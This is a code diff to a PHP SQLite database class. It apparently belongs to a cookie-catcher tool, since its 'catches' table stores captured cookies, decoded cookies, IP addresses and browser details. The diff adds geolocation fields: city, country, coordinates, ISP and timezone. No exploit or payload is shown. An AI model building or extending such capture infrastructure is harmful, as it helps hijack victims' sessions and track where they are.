@@ -5,7 +5,7 @@ class Database {
     public function __construct() {
 		try {
 			self::$_PDO = new \PDO("sqlite:" . Config::Get("Database/SQLite"));
-			self::$_PDO->exec("CREATE TABLE IF NOT EXISTS catches (id VARCHAR(32), cookie TEXT, decoded_cookie TEXT, ip_address VARCHAR(255), user_agent VARCHAR TEXT, local_hostname VARCHAR (255), hostname VARCHAR (255), location TEXT, client_os VARCHAR(50), client_browser VARCHAR(50), catch_date DATETIME, unique(id))");
+			self::$_PDO->exec("CREATE TABLE IF NOT EXISTS catches (id VARCHAR(32), cookie TEXT, decoded_cookie TEXT, ip_address VARCHAR(255), user_agent VARCHAR TEXT, local_hostname VARCHAR (255), hostname VARCHAR (255), city VARCHAR (255), region VARCHAR (255), country VARCHAR (255), latitude VARCHAR (30), longitude VARCHAR (30), service_provider TEXT, timezone VARCHAR (50), location TEXT, client_os VARCHAR(50), client_browser VARCHAR(50), catch_date DATETIME, unique(id))");
 		} catch (PDOException $e) {
 			Logger::Error("database-connect", $e);
 		}
@@ -105,6 +105,13 @@ class Database {
 								"user_agent" => $Row->user_agent,
 								"local_hostname" => $Row->local_hostname, 
 								"hostname" => $Row->hostname,
+								"city" => $Row->city,
+								"region" => $Row->region,
+								"country" => $Row->country,
+								"latitude" => $Row->latitude,
+								"longitude" => $Row->longitude,
+								"service_provider" => $Row->service_provider,
+								"timezone" => $Row->timezone,
 								"location" => $Row->location,
 								"client_os" => $Row->client_os,
 								"client_browser" => $Row->client_browser,
